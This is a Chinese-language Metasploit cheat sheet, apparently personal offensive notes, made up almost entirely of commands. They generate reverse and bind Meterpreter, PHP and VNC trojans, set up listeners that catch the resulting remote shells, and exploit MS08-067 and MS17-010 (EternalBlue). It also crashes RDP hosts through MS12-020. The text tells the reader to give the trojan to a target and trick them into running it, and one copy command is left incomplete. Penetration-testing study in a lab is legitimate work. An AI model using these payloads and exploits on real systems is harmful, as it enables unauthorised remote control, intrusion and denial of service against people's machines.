# Metasploit

| 编撰人 | 日期       | 版本 |
| ------ | ---------- | ---- |
| Khazix | 2018-01-21 | 初始 |

## Payload

- 正向连接

``` msf
use windows/meterpreter/bind_tcp
set rhost 192.168.137.130
set rport 444
generate -t exe -f Trojan.exe
ls
```

生成 Trojan.exe 放给对方主机诱导点击运行

- 反向连接

可以绕过防火墙，缺点是容易暴露自己ip，需要对方和自己网络能通

``` msf
use windows/meterpreter/reverse_tcp
set lhost 192.168.137.130
set lport 444
generate -t exe -f Trojan.exe
ls
```

- 后门利用

正向连接

``` msf
use exploit/multi/handler
set rhost 192.168.137.130
set rport 444
run
```

反弹监听

``` msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.137.130
set LPORT 444
run
```

## msfvenom

msfvenom 和 msfconsole里的 generate 是一样的，不过参数有变化

- 生成php木马

``` sh
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.137.130 lport=444 -f raw -o a.php
```

- 生成vnc木马

图形界面的木马

``` sh
msfvenom -p windows/vncinject/reverse_tcp lhost=192.168.137.128 lport=444 -f exe -o vnc.exe
```

监听反弹

``` msf
use exploit/multi/handler
set payload windows/vncinject/reverse_tcp
set lport 444
```

如果希望鼠标操作对方窗口

``` msf
set viewOnly  FALSE
```

- 生成metapreter木马

``` msf
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.137.130
set lport 444
run
```




## 辅助命令

- 使用 postgresql 缓存加速搜索

``` sh
service postgresql start
msfdb reinit
```

``` msf
db_rebuild_cache
```

- 查看exploit 和 payload

``` msf
show exploit
show payload
```

## MS08-067

Samba 相对路径溢出攻击

- 信息收集

结合nmap扫描漏洞

``` msf
db_nmap -sS -p445 192.168.137.128
services
vulns
```

- 执行攻击

``` msf
search ms08-067
use exploit/windows/smb/ms08_067_netapi
info
set target 34
set payload  windows/meterpreter/reverse_tcp
set lhost 192.168.137.128
set lport 444
```

## FTP匿名登陆

search选项

- app       :  Modules that are client or server attacks
- author    :  Modules written by this author
- bid       :  Modules with a matching Bugtraq ID
- cve       :  Modules with a matching CVE ID
- edb       :  Modules with a matching Exploit-DB ID
- name      :  Modules with a matching descriptive name
- platform  :  Modules affecting this platform
- ref       :  Modules with a matching ref
- type      :  Modules of a specific type (exploit, auxiliary, or post)

``` msf
search cve-2017
use auxiliary/scanner/ftp/anonymous
info
set rhost 192.168.137.128
run
```

## MS17-010

著名的勒索病毒：永恒之蓝

- 探测漏洞

``` msf
search ms17-010
use auxiliary/scanner/smb/smb_ms17_010
info
show missing
run
```

不过这里msf自带的对中国的电脑并不是很好使，用github上的ruby脚本

``` sh
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
cp Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb 
show targets
set target 0
```


## MS12-020

远程桌面拒绝服务漏洞，效果是开启远程桌面的主机变成蓝屏，不造成实质影响

- 扫描探测

``` msf
search ms12-020
use auxiliary/scanner/rdp/ms12_020_check
show missing
set rhost 192.168.137.130
```

- 执行攻击

``` msf
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set RHOST 192.168.137.130
run
```

## 相关链接

https://www.sec-wiki.com/
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/SecWiki/linux-kernel-exploits




